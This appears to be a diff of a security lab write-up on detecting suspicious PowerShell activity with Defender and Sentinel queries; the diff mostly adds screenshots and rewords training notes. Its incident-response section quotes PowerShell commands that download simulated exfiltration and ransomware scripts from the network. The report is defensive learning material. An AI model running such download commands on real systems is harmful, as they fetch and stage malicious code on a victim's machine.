@@ -39,6 +39,7 @@ DeviceProcessEvents
 | where DeviceName == "rich-mde-test"
 | where FileName == "powershell.exe"
 ```
+![image](https://github.com/user-attachments/assets/c78d38c4-e06f-4fa2-91dd-f482e06f490e)
 
 ### Refined Detection Query
 
@@ -51,6 +52,7 @@ DeviceProcessEvents
 | project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName
 | order by Timestamp desc
 ```
+![image](https://github.com/user-attachments/assets/3128dbbc-c1bf-437d-a50b-f186a315af26)
 
 > 💡 *Note: VM is not always on, so we search across 10 days. If live 24/7, a 24-hour window would be more efficient.*
 
@@ -72,6 +74,12 @@ DeviceProcessEvents
 
 After creating and testing the query, an alert rule was deployed in Sentinel. This rule was assigned, activated, and monitored for real-time threat detection.
 
+![image](https://github.com/user-attachments/assets/f2c59a5b-e5bc-4c8f-9150-48e180a64405)
+![image](https://github.com/user-attachments/assets/ccae069b-2863-4ba1-95ce-7d6aa157abc3)
+![image](https://github.com/user-attachments/assets/ece70497-e4ed-42c6-a203-c5f7effa716c)
+![image](https://github.com/user-attachments/assets/5af2c1b9-b8fe-4918-9806-de07dc96d379)
+![image](https://github.com/user-attachments/assets/3d535aae-e69a-44fb-9ecf-699d8783243b)
+
 ---
 
 ## 🔍 Part 3: Incident Response (NIST Lifecycle)
@@ -86,6 +94,7 @@ Invoke-WebRequest -Uri https://raw.githubusercontent.com/.../eicar.ps1 -OutFile 
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/.../exfiltratedata.ps1 -OutFile C:\ProgramData\exfiltratedata.ps1
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/.../pwncrypt.ps1 -OutFile C:\ProgramData\pwncrypt.ps1
 ```
+![image](https://github.com/user-attachments/assets/179529d8-0abe-4c27-ba4a-613099d43eac)
 
 > 🧑‍💻 *User claimed they installed "free software"; in reality, the attack simulator executed the downloads.*
 
@@ -101,13 +110,16 @@ Invoke-WebRequest -Uri https://raw.githubusercontent.com/.../pwncrypt.ps1 -OutFi
 - Isolated VM via MDE.
 - Performed anti-malware scan (clean).
 - Removed isolation after confirmation.
+  
+![image](https://github.com/user-attachments/assets/f37fa957-3fdb-4ad4-b3f3-a2400b944357)
+
 
 ---
 
 ## ✅ Post-Incident Activities
 
-- Enforced user cybersecurity training (Ninjio).
-- Mandated weekly training confirmation to supervisors.
+- Enforced user cybersecurity awareness training (Ninjio).
+- Mandated weekly cybersecurity awareness video with confirmation to supervisor.
 - Restricted PowerShell access for non-essential users.
 
 ---
@@ -116,3 +128,6 @@ Invoke-WebRequest -Uri https://raw.githubusercontent.com/.../pwncrypt.ps1 -OutFi
 
 - Incident marked as: **True Positive - Suspicious Activity**
 - Status: **Closed**
+
+![image](https://github.com/user-attachments/assets/e052cf8b-a8bc-470b-8758-2d81bddd1569)
+![image](https://github.com/user-attachments/assets/8e06dbdf-2e5a-4c5d-9b9a-923656e04b4d)
